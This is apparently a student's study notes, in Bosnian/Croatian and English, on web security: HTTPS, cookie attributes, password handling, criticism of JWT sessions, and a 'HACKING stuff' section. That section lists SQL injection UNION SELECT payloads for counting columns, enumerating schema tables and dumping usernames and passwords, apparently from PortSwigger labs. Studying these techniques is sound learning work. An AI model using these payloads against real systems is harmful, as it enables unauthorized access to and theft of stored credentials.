
PREDOBROOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO:
https://portswigger.net/web-security/learning-path

https://www.youtube.com/watch?v=2PPSXonhIck


Ekstra knjiga za identity management:  
Keycloak - Identity and Access Management for Modern Applications: Harness the power of Keycloak, OpenID Connect, and OAuth 2.0 protocols to secure applications

## HTTPS
Always use HTTPS protocol.  
Avoid lots of troubles with man-in-the-middle attack.  


## URLs

Don't send *sensitive data* in URLs:
- username/password
- security/session/jwt token

Why?
- they can be logged in user's history, server logs, proxies etc.


## Passwords

Reset passworda je MUST HAVE:
- ako user zaboravi pwd
- periodično NATJERAT usera da promijeni password
- ako je neko skonto password, za 7 dana neće biti validan -> stonks

Slanje passworda na mail -> NO
Predvidivi generisani passwordi -> NO

## Usernames
Nejedinstveni username -> WTF IS WRONG WITH YOU?

## Cookies
Koristi HTTPS, jer session hijacking..  
Koristi `Secure` atribut da **osiguramo da će browser slati ga samo preko TLS**.  
Koristi `HttpOnly` atribut da **osiguramo da ga JS ne može čitati/pisati** sa `document.cookie` (XSS stonks).  
Koristi `SameSite` : Lax/Strict

Ne koristi `Path` atribut za security. Tj setuj ga samo na `Path=/`  
Ne koristi `Domain` atribut (poddomena može bit hakovana i zarazit ostale domene..).

------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------
## JWTs are bullshit (for sessions)

- Logout? -> NO
- Change roles -> NO (fuck you, this is STILL a valid token.. :) )


------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------
HACKING stuff
------------------------------------------------------------------------------------------------------------
# SQL injection

## UNION SELECT napad

### Skontaš broj kolona
```sql
' ORDER+BY+3--
```
ili
```sql
'+UNION+SELECT+NULL,NULL--
```
(kod Oracle MORA 'SELECT .. FROM DUAL')
dok ne potrefiš broj kolona...

### Skontaš koja kolona je string (obično)

```sql
' UNION SELECT NULL,NULL,'a',NULL--
```

dok ne potrefiš koja kolona paše.. :)

### UNION SELECT
```sql
' UNION SELECT username, password FROM users--
```

### Browsing the db schema

'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--
--> users_lqlezz npr

'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_lqlezz'--
--> username_jyfedi,password_fxqtrq

' UNION SELECT username_jyfedi,password_fxqtrq FROM users_lqlezz--

ORACLE:
all_tables i all_tab_columns


